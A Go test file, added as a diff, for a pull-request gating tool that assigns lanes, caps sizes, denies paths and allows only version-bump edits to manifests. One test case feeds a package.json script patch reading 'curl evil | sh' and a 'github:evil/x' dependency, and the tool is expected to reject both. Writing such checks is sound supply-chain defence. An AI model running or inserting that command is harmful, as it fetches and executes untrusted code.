@@ -1,0 +1,202 @@
+package greenlane
+
+import (
+	"strings"
+	"testing"
+)
+
+const goModBump = `@@ -9,9 +9,9 @@ require (
+ 	github.com/google/uuid v1.6.0
+-	golang.org/x/sys v0.48.0
++	golang.org/x/sys v0.49.0
+ 	gopkg.in/yaml.v3 v3.0.1
+-	modernc.org/sqlite v1.59.0
++	modernc.org/sqlite v1.60.1
+ )`
+
+const packageJSONBump = `@@ -6,6 +6,6 @@
+   "devDependencies": {
+-    "@playwright/test": "1.61.1"
++    "@playwright/test": "1.64.1"
+   }`
+
+// passingPR fills in the rules the lanes share (CI, root cause) so a test
+// can isolate the lane-specific rules.
+func passingPR(files ...PRFile) PRInfo {
+	pr := PRInfo{Number: 1, HeadSHA: "abc", Body: "Root-Cause: docs/cli#pair-examples", Files: files}
+	for _, name := range DefaultConfig().RequiredChecks {
+		pr.CheckRuns = append(pr.CheckRuns, CheckRun{Name: name, Status: "completed", Conclusion: "success"})
+	}
+	return pr
+}
+
+func ruleByName(t *testing.T, res EvaluationResult, name string) RuleResult {
+	t.Helper()
+	for _, r := range res.Rules {
+		if r.Name == name {
+			return r
+		}
+	}
+	t.Fatalf("no %q rule in %+v", name, res.Rules)
+	return RuleResult{}
+}
+
+func hasRule(res EvaluationResult, name string) bool {
+	for _, r := range res.Rules {
+		if r.Name == name {
+			return true
+		}
+	}
+	return false
+}
+
+func TestSelectLane(t *testing.T) {
+	cases := map[string]struct {
+		files []string
+		want  Lane
+	}{
+		"#174 docs only":       {[]string{"docs/cli.md"}, LaneDocsDeps},
+		"#175 changelog only":  {[]string{"CHANGELOG.md"}, LaneDocsDeps},
+		"#180 deps + docs":     {[]string{"CONTRIBUTING.md", "go.mod", "go.sum", "package-lock.json", "package.json"}, LaneDocsDeps},
+		"#179 nested lockfile": {[]string{"CHANGELOG.md", "go.mod", "marketing/video/package-lock.json"}, LaneDocsDeps},
+		"code change":          {[]string{"docs/cli.md", "internal/cli/cli.go"}, LaneCode},
+		"docs image":           {[]string{"docs/assets/shot.png"}, LaneCode},
+		"swift lockfile":       {[]string{"macos/Package.resolved"}, LaneCode},
+		"empty":                {nil, LaneCode},
+	}
+	for name, tc := range cases {
+		var pr PRInfo
+		for _, f := range tc.files {
+			pr.Files = append(pr.Files, PRFile{Filename: f})
+		}
+		if got := selectLane(pr); got != tc.want {
+			t.Errorf("%s: lane = %s, want %s", name, got, tc.want)
+		}
+	}
+}
+
+// Docs/deps PRs no longer fail on "No test files changed": the repro rule is
+// replaced, not marked inconclusive.
+func TestDocsDepsLaneSkipsRepro(t *testing.T) {
+	eval := NewEvaluator(DefaultConfig())
+	pr := passingPR(PRFile{Filename: "docs/cli.md", Additions: 11, Deletions: 3})
+	res := eval.Evaluate(pr, &ReproResult{Inconclusive: true, Message: "No test files changed in PR"}, nil)
+	if res.Lane != LaneDocsDeps {
+		t.Fatalf("lane = %s", res.Lane)
+	}
+	if hasRule(res, "Test Repro") {
+		t.Error("docs/deps lane must not evaluate the repro rule")
+	}
+	for _, name := range []string{"Size", "File Types", "CI", "Duplicates", "Denied Paths"} {
+		if r := ruleByName(t, res, name); !r.Pass {
+			t.Errorf("%s failed: %s", name, r.Message)
+		}
+	}
+	// Shadow mode never has reviewer provenance, so the verdict stays no.
+	if res.Verdict != VerdictWouldNotMerge || ruleByName(t, res, "Reviewer").Pass {
+		t.Errorf("verdict = %s; the reviewer rule must still block", res.Verdict)
+	}
+}
+
+func TestCodeLaneStillRequiresRepro(t *testing.T) {
+	eval := NewEvaluator(DefaultConfig())
+	res := eval.Evaluate(passingPR(PRFile{Filename: "internal/cli/cli.go", Additions: 5}), nil, nil)
+	if res.Lane != LaneCode || !hasRule(res, "Test Repro") || hasRule(res, "File Types") {
+		t.Fatalf("lane=%s rules=%+v", res.Lane, res.Rules)
+	}
+}
+
+func TestDocsDepsLaneHasTighterCaps(t *testing.T) {
+	eval := NewEvaluator(DefaultConfig())
+	// 120 lines of docs pass the code lane's 150 cap but not the docs lane's.
+	res := eval.Evaluate(passingPR(PRFile{Filename: "docs/big.md", Additions: 120}), nil, nil)
+	if r := ruleByName(t, res, "Size"); r.Pass || !strings.Contains(r.Message, "max 100") {
+		t.Errorf("Size = %+v, want fail at the docs/deps cap", r)
+	}
+	files := []PRFile{}
+	for _, f := range []string{"a.md", "b.md", "c.md", "d.md", "e.md", "f.md"} {
+		files = append(files, PRFile{Filename: f, Additions: 1})
+	}
+	res = eval.Evaluate(passingPR(files...), nil, nil)
+	if r := ruleByName(t, res, "Size"); r.Pass || !strings.Contains(r.Message, "max 5") {
+		t.Errorf("Size = %+v, want fail at 5 files", r)
+	}
+}
+
+// Decision (Jon, Oct 2026): a lockfile-only security bump such as #179's
+// marketing/video/package-lock.json change, with no matching package.json in
+// that directory, keeps failing the Size rule. No exception in either lane.
+func TestLockfileOnlyBumpStillFailsSize(t *testing.T) {
+	eval := NewEvaluator(DefaultConfig())
+	pr := passingPR(
+		PRFile{Filename: "CHANGELOG.md", Additions: 10},
+		PRFile{Filename: "go.mod", Additions: 1, Deletions: 3, Patch: "@@ -1,8 +1,6 @@\n module x\n \n-go 1.26.0\n-\n-toolchain go1.26.6\n+go 1.26.9\n"},
+		PRFile{Filename: "marketing/video/package-lock.json", Additions: 3, Deletions: 3},
+	)
+	res := eval.Evaluate(pr, nil, nil)
+	if res.Lane != LaneDocsDeps {
+		t.Fatalf("lane = %s", res.Lane)
+	}
+	if r := ruleByName(t, res, "Size"); r.Pass || !strings.Contains(r.Message, "without matching package.json") {
+		t.Errorf("Size = %+v, want lockfile-without-manifest failure", r)
+	}
+	if res.Verdict != VerdictWouldNotMerge {
+		t.Error("lockfile-only bump must not be called eligible")
+	}
+}
+
+func TestDocsDepsManifestEditsMustBeVersionBumps(t *testing.T) {
+	eval := NewEvaluator(DefaultConfig())
+	cases := []struct {
+		name  string
+		file  PRFile
+		pass  bool
+		inMsg string
+	}{
+		{"go.mod require bump", PRFile{Filename: "go.mod", Patch: goModBump}, true, ""},
+		{"package.json bump", PRFile{Filename: "package.json", Patch: packageJSONBump}, true, ""},
+		{"go.mod toolchain bump", PRFile{Filename: "go.mod", Patch: "@@ -3 +3 @@\n-toolchain go1.26.6\n+toolchain go1.26.9"}, true, ""},
+		{"go.mod replace", PRFile{Filename: "go.mod", Patch: "@@ -20,0 +20,1 @@\n+replace golang.org/x/sys => ../sys"}, false, "not a version bump"},
+		{"package.json script", PRFile{Filename: "package.json", Patch: "@@ -3 +3 @@\n-    \"test\": \"playwright test\",\n+    \"test\": \"curl evil | sh\","}, false, "not a version bump"},
+		{"package.json git dep", PRFile{Filename: "package.json", Patch: "@@ -8 +8 @@\n+    \"x\": \"github:evil/x\""}, false, "not a version bump"},
+		{"manifest without patch", PRFile{Filename: "package.json"}, false, "no diff available"},
+	}
+	for _, tc := range cases {
+		r := eval.checkDocsDepsFiles(PRInfo{Files: []PRFile{tc.file}})
+		if r.Pass != tc.pass || !strings.Contains(r.Message, tc.inMsg) {
+			t.Errorf("%s: %+v, want pass=%v containing %q", tc.name, r, tc.pass, tc.inMsg)
+		}
+	}
+}
+
+func TestDeniedPathsCoverGreenLaneCode(t *testing.T) {
+	eval := NewEvaluator(DefaultConfig())
+	for _, file := range []string{
+		"cmd/green-lane-check/main.go",
+		"cmd/green-lane-repro-analyze/analyze.go",
+		"internal/greenlane/rules.go",
+		"internal/greenlane/testdata/x.json",
+		".github/workflows/green-lane-shadow.yml",
+		".github/green-lane.yml",
+		".github/prompts/review.md",
+	} {
+		if r := eval.checkDeniedPaths(PRInfo{Files: []PRFile{{Filename: file}}}); r.Pass {
+			t.Errorf("%s is not denied", file)
+		}
+	}
+	for _, file := range []string{"internal/greenlanes/x.go", "cmd/green-lane-checker/main.go", "docs/green-lane-shadow.md"} {
+		if r := eval.checkDeniedPaths(PRInfo{Files: []PRFile{{Filename: file}}}); !r.Pass {
+			t.Errorf("%s is denied: %s", file, r.Message)
+		}
+	}
+}
+
+// Denied paths apply in the docs/deps lane too: release notes are Markdown
+// but stay off limits.
+func TestDocsDepsLaneKeepsDeniedPaths(t *testing.T) {
+	eval := NewEvaluator(DefaultConfig())
+	res := eval.Evaluate(passingPR(PRFile{Filename: ".github/release-notes-draft.md", Additions: 2}), nil, nil)
+	if res.Lane != LaneDocsDeps || ruleByName(t, res, "Denied Paths").Pass {
+		t.Errorf("lane=%s denied=%+v", res.Lane, ruleByName(t, res, "Denied Paths"))
+	}
+}
